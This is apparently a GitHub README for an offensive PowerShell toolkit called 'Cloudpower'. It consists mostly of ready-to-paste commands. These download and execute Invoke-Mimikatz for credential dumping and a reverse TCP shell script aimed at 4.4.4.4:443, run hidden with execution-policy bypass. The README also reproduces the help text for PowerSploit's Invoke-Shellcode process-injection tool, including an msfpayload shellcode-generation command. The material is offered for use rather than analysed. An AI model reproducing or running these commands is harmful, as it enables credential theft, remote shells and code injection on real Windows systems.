# Cloudpower
test for interest
The Invoke-Mimikatz & Invoke-Shellcode is from https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/

# Help for Invoke-Mimikatz:
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aspiggy/Cloudpower/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz



# Help for rev.ps1:
It's a reverse_tcp payload, please set a listener, then do as below:

winx86:

powershell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aspiggy/Cloudpower/master/rev.ps1'); rev -ip 4.4.4.4 -port 443"

winx64:

C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aspiggy/Cloudpower/master/rev.ps1'); rev -ip 4.4.4.4 -port 443"

# Help for Invoke-Shellcode:
.SYNOPSIS

Inject shellcode into the process ID of your choosing or within the context of the running PowerShell process.
PowerSploit Function: Invoke-Shellcode
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Portions of this project was based upon syringe.c v1.2 written by Spencer McIntyre
PowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use this command from within Backtrack (Thanks, Matt and g0tm1lk):
msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 
Make sure to specify 'thread' for your exit process. Also, don't bother encoding your shellcode. It's entirely unnecessary.
 
.PARAMETER ProcessID

Process ID of the process you want to inject shellcode into.

.PARAMETER Shellcode

Specifies an optional shellcode passed in as a byte array

.PARAMETER Force

Injects shellcode without prompting for confirmation. By default, Invoke-Shellcode prompts for confirmation before performing any malicious act.

.EXAMPLE

 C:\PS> Invoke-Shellcode -ProcessId 4274

-----------
Inject shellcode into process ID 4274.

.EXAMPLE

C:\PS> Invoke-Shellcode

-----------
Inject shellcode into the running instance of PowerShell.

.EXAMPLE

C:\PS> Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)

-----------
Overrides the shellcode included in the script with custom shellcode - 0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit!
